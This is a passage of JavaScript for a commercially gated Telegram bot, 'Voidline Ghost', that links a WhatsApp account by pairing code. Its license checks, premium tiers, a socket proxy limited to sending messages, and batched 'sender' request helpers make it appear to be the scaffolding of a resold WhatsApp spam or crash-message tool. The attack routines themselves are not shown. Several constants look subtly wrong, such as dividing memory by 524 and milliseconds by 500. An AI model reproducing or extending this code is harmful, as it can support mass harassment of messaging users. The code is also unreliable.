⠀⠀⠀⠀⠀⠀⠀⠈⠻⣶⡷⡜⣿⣻⠈⣦⣀⣀⠉⠀⣀⣠⡏⢹⣿⣏⡼⣡⡾⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣻⡄⠹⡙⠛⠿⠟⠛⡽⠀⣿⣻⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡏⢏⢿⡀⣹⢲⣶⡶⢺⡀⣴⢫⢃⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠈⠷⠭⠽⠛⠛⠛⠋⠭⠴⠋⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⣄⡀⢀⣀⣠⣀⣀⢀⣀⣴⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

═══════════
═════════════════════
Token tidak terdaftar, Mohon membeli akses kepada reseller yang tersedia
═════════════════════
═══════════
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.yellow(`
⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀
⠀⣠⠾⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⢦⠀
⢰⠇⠀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠈⣧
⠘⡇⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⣿
⠀⡇⠘⡄⢱⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⢁⡆⢀⡏
⠀⠹⣄⠹⡀⠙⣄⠀⠀⠀⠀⠀⢀⣤⣴⣶⣶⣶⣾⣶⣶⣶⣶⣤⣀⠀⠀⠀⠀⠀⢀⠜⠁⡜⢀⡞⠀
⠀⠀⠘⣆⢣⡄⠈⢣⡀⢀⣤⣾⣿⣿⢿⠉⠉⠉⠉⠉⠉⠉⣻⢿⣿⣷⣦⣄⠀⡰⠋⢀⣾⢡⠞⠀⠀
⠀⠀⠀⠸⣿⡿⡄⡀⠉⠙⣿⡿⠁⠈⢧⠃⠀⠀⠀⠀⠀⠀⢷⠋⠀⢹⣿⠛⠉⢀⠄⣞⣧⡏⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣹⠘⡆⠀⡿⢁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢻⡆⢀⡎⣼⣽⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣹⣿⣇⠹⣼⣷⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⣳⡜⢰⣿⣟⡀⠀⠀⠀⠀
⠀⠀⠀⠀⡾⡉⠛⣿⠴⠳⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠳⢾⠟⠉⢻⡀⠀⠀⠀
⠀⠀⠀⠀⣿⢹⠀⢘⡇⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⡏⠀⡼⣾⠇⠀⠀⠀
⠀⠀⠀⠀⢹⣼⠀⣾⠀⣀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣄⡀⢹⠀⢳⣼⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣇⠀⠸⣾⠁⠀⠀⠀⠀⠀⢀⡾⠀⠀⠀⠰⣄⠀⠀⠀⠀⠀⠀⣹⡞⠀⣀⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠈⣇⠱⡄⢸⡛⠒⠒⠒⠒⠚⢿⣇⠀⠀⠀⢠⣿⠟⠒⠒⠒⠒⠚⡿⢀⡞⢹⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡞⢰⣷⠀⠑⢦⣄⣀⣀⣠⠞⢹⠀⠀⠀⣸⠙⣤⣀⣀⣀⡤⠞⠁⢸⣶⢸⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠰⣧⣰⠿⣄⠀⠀⠀⢀⣈⡉⠙⠏⠀⠀⠀⠘⠛⠉⣉⣀⠀⠀⠀⢀⡟⣿⣼⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡿⠀⠘⠷⠤⠾⢻⠞⠋⠀⠀⠀⠀⠀⠀⠀⠘⠛⣎⠻⠦⠴⠋⠀⠹⡆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠸⣿⡀⢀⠀⠀⡰⡌⠻⠷⣤⡀⠀⠀⠀⠀⣠⣶⠟⠋⡽⡔⠀⡀⠀⣰⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⢷⣄⡳⡀⢣⣿⣀⣷⠈⠳⣦⣀⣠⡾⠋⣸⡇⣼⣷⠁⡴⢁⣴⠟⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠻⣶⡷⡜⣿⣻⠈⣦⣀⣀⠉⠀⣀⣠⡏⢹⣿⣏⡼⣡⡾⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣻⡄⠹⡙⠛⠿⠟⠛⡽⠀⣿⣻⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡏⢏⢿⡀⣹⢲⣶⡶⢺⡀⣴⢫⢃⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠈⠷⠭⠽⠛⠛⠛⠋⠭⠴⠋⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⣄⡀⢀⣀⣠⣀⣀⢀⣀⣴⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

═══════════
═════════════════════
Gagal menghubungkan ke server, Akses ditolak
═════════════════════
═══════════
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

function checkGroupOnly(ctx) {
  if (GROUP_ONLY && ctx.chat.type === "private") {
    ctx.reply("❌ Bot ini hanya dapat digunakan di group!")
      .then((sent) => {
        setTimeout(async () => {
          try {
            await ctx.telegram.deleteMessage(ctx.chat.id, sent.message_id);
          } catch (e) {}

          try {
            await ctx.telegram.deleteMessage(ctx.chat.id, ctx.message.message_id);
          } catch (e) {}
        }, 3000);
      });

    return false;
  }

  return true;
}

function uploadToCatbox(fileUrl) {
  const params = new URLSearchParams();
  params.append("reqtype", "urlupload");
  params.append("url", fileUrl);

  return axios.post("https://catbox.moe/user/api.php", params, {
    headers: { "content-type": "application/x-www-form-urlencoded" },
    timeout: 30000,
  }).then(({ data }) => data);
}

function createSafeSock(sock) {
  return new Proxy(sock, {
    get(target, prop) {
      if (["relayMessage", "sendMessage"].includes(prop)) return target[prop];
      return undefined;
    },
  });
}

function txt(m) {
  if (!m) return "";
  return (m.text || m.caption || "").trim();
}

function parseSecs(s) {
  if (typeof s === "number") return s;
  if (!s || typeof s !== "string") return 0;
  return s
    .split(":")
    .map(n => parseInt(n, 10))
    .reduce((a, v) => a * 60 + v, 0);
}

const topVideos = async (q) => {
  const r = await yts.search(q);
  const list = Array.isArray(r) ? r : (r.videos || []);
  return list
    .filter(v => {
      const sec = typeof v.seconds === "number"
        ? v.seconds
        : parseSecs(v.timestamp || v.duration?.timestamp || v.duration);
      return !v.live && sec > 0 && sec <= 1200;
    })
    .slice(0, 5)
    .map(v => ({
      url: v.url,
      title: v.title
    }));
};

function normalizeYouTubeUrl(raw) {
  if (!raw || typeof raw !== "string") return "";
  let u = raw.trim();

  const shorts = u.match(/shorts\/([A-Za-z0-9_-]+)/i);
  if (shorts) return `https://www.youtube.com/watch?v=${shorts[1]}`;

  const short = u.match(/youtu\.be\/([A-Za-z0-9_-]+)/i);
  if (short) return `https://www.youtube.com/watch?v=${short[1]}`;

  const watch = u.match(/v=([A-Za-z0-9_-]+)/i);
  if (watch) return `https://www.youtube.com/watch?v=${watch[1]}`;

  return u;
}

async function downloadToTemp(url, ext = ".mp3") {
  const file = path.join(os.tmpdir(), `music_${Date.now()}${ext}`);
  const res = await axios.get(url, {
    responseType: "stream",
    timeout: 180000
  });

  await new Promise((resolve, reject) => {
    const w = fs.createWriteStream(file);
    res.data.pipe(w);
    w.on("finish", resolve);
    w.on("error", reject);
  });

  return file;
}

function cleanup(f) {
  try { fs.unlinkSync(f); } catch {}
}

function escapeHtml(text = "") {
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function pickRandom(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

function parallelRequests(tasks, batchSize = 10, delay = 800) {
  return new Promise(async (resolve) => {
    let success = 0;
    let failed = 0;

    for (let i = 0; i < tasks.length; i += batchSize) {
      const batch = tasks.slice(i, i + batchSize);

      const results = await Promise.allSettled(
        batch.map(fn => fn())
      );

      for (const r of results) {
        if (r.status === "fulfilled" && r.value === true) {
          success++;
        } else {
          failed++;
        }
      }

      if (i + batchSize < tasks.length) {
        await sleep(delay);
      }
    }

    resolve({ success, failed });
  });
}

function progressBar(percent) {
  const total = 10
  const filled = Math.floor(percent / 10)
  const empty = total - filled
  return "▰".repeat(filled) + "▱".repeat(empty) + ` ${percent}%`
}

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addpremUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const adminFile = path.join(__dirname, "admin.json");

// Baca admin.json
function loadAdmins() {
    if (!fs.existsSync(adminFile)) {
        fs.writeFileSync(adminFile, JSON.stringify([]));
    }
    return JSON.parse(fs.readFileSync(adminFile));
}

// Simpan admin.json
function saveAdmins(admins) {
    fs.writeFileSync(adminFile, JSON.stringify(admins, null, 2));
}

// Tambah Admin
function addAdminUser(userId) {
    let admins = loadAdmins();
    if (admins.includes(userId)) return false;
    admins.push(userId);
    saveAdmins(admins);
    return true;
}

// Hapus Admin
function delAdminUser(userId) {
    let admins = loadAdmins();
    if (!admins.includes(userId)) return false;
    admins = admins.filter(id => id !== userId);
    saveAdmins(admins);
    return true;
}

// Cek Admin
function isAdmin(userId) {
    let admins = loadAdmins();
    return admins.includes(userId);
}

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 524 / 524;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀
⠀⣠⠾⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⢦⠀
⢰⠇⠀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠈⣧
⠘⡇⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⣿
⠀⡇⠘⡄⢱⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⢁⡆⢀⡏
⠀⠹⣄⠹⡀⠙⣄⠀⠀⠀⠀⠀⢀⣤⣴⣶⣶⣶⣾⣶⣶⣶⣶⣤⣀⠀⠀⠀⠀⠀⢀⠜⠁⡜⢀⡞⠀
⠀⠀⠘⣆⢣⡄⠈⢣⡀⢀⣤⣾⣿⣿⢿⠉⠉⠉⠉⠉⠉⠉⣻⢿⣿⣷⣦⣄⠀⡰⠋⢀⣾⢡⠞⠀⠀
⠀⠀⠀⠸⣿⡿⡄⡀⠉⠙⣿⡿⠁⠈⢧⠃⠀⠀⠀⠀⠀⠀⢷⠋⠀⢹⣿⠛⠉⢀⠄⣞⣧⡏⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣹⠘⡆⠀⡿⢁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢻⡆⢀⡎⣼⣽⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣹⣿⣇⠹⣼⣷⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⣳⡜⢰⣿⣟⡀⠀⠀⠀⠀
⠀⠀⠀⠀⡾⡉⠛⣿⠴⠳⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠳⢾⠟⠉⢻⡀⠀⠀⠀
⠀⠀⠀⠀⣿⢹⠀⢘⡇⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⡏⠀⡼⣾⠇⠀⠀⠀
⠀⠀⠀⠀⢹⣼⠀⣾⠀⣀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣄⡀⢹⠀⢳⣼⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣇⠀⠸⣾⠁⠀⠀⠀⠀⠀⢀⡾⠀⠀⠀⠰⣄⠀⠀⠀⠀⠀⠀⣹⡞⠀⣀⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠈⣇⠱⡄⢸⡛⠒⠒⠒⠒⠚⢿⣇⠀⠀⠀⢠⣿⠟⠒⠒⠒⠒⠚⡿⢀⡞⢹⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡞⢰⣷⠀⠑⢦⣄⣀⣀⣠⠞⢹⠀⠀⠀⣸⠙⣤⣀⣀⣀⡤⠞⠁⢸⣶⢸⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠰⣧⣰⠿⣄⠀⠀⠀⢀⣈⡉⠙⠏⠀⠀⠀⠘⠛⠉⣉⣀⠀⠀⠀⢀⡟⣿⣼⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡿⠀⠘⠷⠤⠾⢻⠞⠋⠀⠀⠀⠀⠀⠀⠀⠘⠛⣎⠻⠦⠴⠋⠀⠹⡆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠸⣿⡀⢀⠀⠀⡰⡌⠻⠷⣤⡀⠀⠀⠀⠀⣠⣶⠟⠋⡽⡔⠀⡀⠀⣰⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⢷⣄⡳⡀⢣⣿⣀⣷⠈⠳⣦⣀⣠⡾⠋⣸⡇⣼⣷⠁⡴⢁⣴⠟⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠻⣶⡷⡜⣿⣻⠈⣦⣀⣀⠉⠀⣀⣠⡏⢹⣿⣏⡼⣡⡾⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣻⡄⠹⡙⠛⠿⠟⠛⡽⠀⣿⣻⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡏⢏⢿⡀⣹⢲⣶⡶⢺⡀⣴⢫⢃⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠈⠷⠭⠽⠛⠛⠛⠋⠭⠴⠋⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⣄⡀⢀⣀⣠⣀⣀⢀⣀⣴⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

═══════════
═════════════════════
☇ Botname: Voidline Ghost 
☇ Version: 5.0
☇ Status: Bot Connected
═════════════════════
═══════════
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '5.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote><pre>⬡═—⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡</pre></blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘———————————————═⬡`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀
⠀⣠⠾⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⢦⠀
⢰⠇⠀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠈⣧
⠘⡇⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⣿
⠀⡇⠘⡄⢱⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⢁⡆⢀⡏
⠀⠹⣄⠹⡀⠙⣄⠀⠀⠀⠀⠀⢀⣤⣴⣶⣶⣶⣾⣶⣶⣶⣶⣤⣀⠀⠀⠀⠀⠀⢀⠜⠁⡜⢀⡞⠀
⠀⠀⠘⣆⢣⡄⠈⢣⡀⢀⣤⣾⣿⣿⢿⠉⠉⠉⠉⠉⠉⠉⣻⢿⣿⣷⣦⣄⠀⡰⠋⢀⣾⢡⠞⠀⠀
⠀⠀⠀⠸⣿⡿⡄⡀⠉⠙⣿⡿⠁⠈⢧⠃⠀⠀⠀⠀⠀⠀⢷⠋⠀⢹⣿⠛⠉⢀⠄⣞⣧⡏⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣹⠘⡆⠀⡿⢁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢻⡆⢀⡎⣼⣽⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣹⣿⣇⠹⣼⣷⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⣳⡜⢰⣿⣟⡀⠀⠀⠀⠀
⠀⠀⠀⠀⡾⡉⠛⣿⠴⠳⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠳⢾⠟⠉⢻⡀⠀⠀⠀
⠀⠀⠀⠀⣿⢹⠀⢘⡇⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⡏⠀⡼⣾⠇⠀⠀⠀
⠀⠀⠀⠀⢹⣼⠀⣾⠀⣀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣄⡀⢹⠀⢳⣼⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣇⠀⠸⣾⠁⠀⠀⠀⠀⠀⢀⡾⠀⠀⠀⠰⣄⠀⠀⠀⠀⠀⠀⣹⡞⠀⣀⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠈⣇⠱⡄⢸⡛⠒⠒⠒⠒⠚⢿⣇⠀⠀⠀⢠⣿⠟⠒⠒⠒⠒⠚⡿⢀⡞⢹⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡞⢰⣷⠀⠑⢦⣄⣀⣀⣠⠞⢹⠀⠀⠀⣸⠙⣤⣀⣀⣀⡤⠞⠁⢸⣶⢸⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠰⣧⣰⠿⣄⠀⠀⠀⢀⣈⡉⠙⠏⠀⠀⠀⠘⠛⠉⣉⣀⠀⠀⠀⢀⡟⣿⣼⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡿⠀⠘⠷⠤⠾⢻⠞⠋⠀⠀⠀⠀⠀⠀⠀⠘⠛⣎⠻⠦⠴⠋⠀⠹⡆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠸⣿⡀⢀⠀⠀⡰⡌⠻⠷⣤⡀⠀⠀⠀⠀⣠⣶⠟⠋⡽⡔⠀⡀⠀⣰⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⢷⣄⡳⡀⢣⣿⣀⣷⠈⠳⣦⣀⣠⡾⠋⣸⡇⣼⣷⠁⡴⢁⣴⠟⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠻⣶⡷⡜⣿⣻⠈⣦⣀⣀⠉⠀⣀⣠⡏⢹⣿⣏⡼⣡⡾⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣻⡄⠹⡙⠛⠿⠟⠛⡽⠀⣿⣻⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡏⢏⢿⡀⣹⢲⣶⡶⢺⡀⣴⢫⢃⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠈⠷⠭⠽⠛⠛⠛⠋⠭⠴⠋⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⣄⡀⢀⣀⣠⣀⣀⢀⣀⣴⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


═══════════
═════════════════════
☇ Botname: Voidline Ghost 
☇ Version: 5.0
☇ Status: Bot Connected
═════════════════════
═══════════
  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 500

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("reqpair", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /reqpair 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "ZARRBILA");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `
<blockquote><b> ⬡═―—⊱ ⎧ 𝗩𝗢𝗜𝗗𝗟𝗜𝗡𝗘 𝗚𝗛𝗢𝗦𝗧 ⎭ ⊰―—═⬡
⛧ Number: ${phoneNumber}
⛧ Pairing Code: ${formattedCode}
⛧ Status: Not Connected
</b></blockquote>`;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
